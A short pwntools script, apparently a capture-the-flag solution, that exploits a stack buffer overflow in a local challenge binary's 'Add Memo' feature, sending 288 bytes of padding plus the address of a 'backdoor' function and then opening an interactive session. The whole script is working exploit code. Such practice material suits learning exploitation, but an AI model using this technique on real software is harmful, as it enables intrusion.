from pwn import *

elf= ELF('chal')
r= process('./chal')


offset = 288
payload = b"A" * offset
payload+= p64(0xdeadbeef)
payload += p64(elf.sym.backdoor)

print(r.recvuntil("> "))
r.sendline("1") # Add Memo
print(r.recvuntil(": "))
r.sendline("goodluck") # password
print(r.recvuntil(": "))
r.sendline("304") # memo size 288 + 8 + 8
print(r.recvuntil(": "))
r.sendline(payload) # payload to call backdoor()
print(r.recvuntil("> "))
r.sendline("4") # Exit, to call ret

r.interactive()
